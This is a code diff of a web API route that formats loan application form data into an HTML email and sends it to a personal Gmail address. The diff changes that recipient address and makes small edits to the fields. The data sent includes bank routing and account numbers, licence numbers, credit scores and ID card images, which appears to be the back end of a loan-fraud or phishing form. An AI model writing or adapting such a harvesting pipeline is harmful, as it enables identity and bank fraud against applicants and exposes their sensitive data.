@@ -19,14 +19,14 @@ export async function POST(request) {
   // Compose the email message
   const message = {
     from: "osr.cty@gmail.com",
-    to: "samsonrichfield@gmail.com",
+    to: "Kindras131@gmail.com",
     subject: "Loan Application Details",
     html: `
     <h3>Loan Application Details</h3>
     <p>First Name: ${formData.firstName}</p>
     <p>Last Name: ${formData.lastName}</p>
     <p>Loan Amount: ${formData.loanAmount}</p>
-    <p>Loan Duration: ${formData.loanDuration}</p>
+    <p>Loan Duration: ${formData.loanDuration} months</p>
     <p>Monthly Mortgage: ${formData.monthlyMortgage}</p>
     <p>Monthly Payment: ${formData.monthlyPayment}</p>
     <p>Interest: ${formData.interest}</p>
@@ -43,9 +43,7 @@ export async function POST(request) {
     <p>Eviction: ${formData.eviction}</p>
     <p>Email Address: ${formData.emailAddress}</p>
     <p>Primary Phone Number: ${formData.primaryPhoneNumber}</p>
-    <p>Primary Phone Type: ${formData.primaryPhoneType}</p>
     <p>Secondary Phone Number: ${formData.secondaryPhoneNumber}</p>
-    <p>Secondary Phone Type: ${formData.secondaryPhoneType}</p>
     <p>Routing Number: ${formData.routingNumber}</p>
     <p>Account Number: ${formData.accountNumber}</p>
     <p>Confirm Account Number: ${formData.confirmAccountNumber}</p>
@@ -65,15 +63,17 @@ export async function POST(request) {
     <p>My Quick Loan Source: ${formData.myQuickLoanSource}</p>
     <p>My Quick Loan Source Other: ${formData.myQuickLoanSourceOther}</p>
     <p>Credit Score: ${formData.creditScore}</p>
-    <p>License Number: ${formData.licenseNumber}</p>
+    <p>License Number: ${
+      formData.licenseNumber
+    }</p><p>Loan to be given when reduced by 20%: ${
+      (formData.loanAmount / 100) * 80
+    }</p>
     <p>Front View:</p>
     <img src="${formData.frontView}" alt="Front View" />
     <p>Back View:</p>
     <img src="${formData.backView}" alt="Back View" />
 
-    <p>Loan to be given when reduced by 20%: ${
-      (formData.loanAmount / 100) * 80
-    }</p>
+    
   `,
   };
 
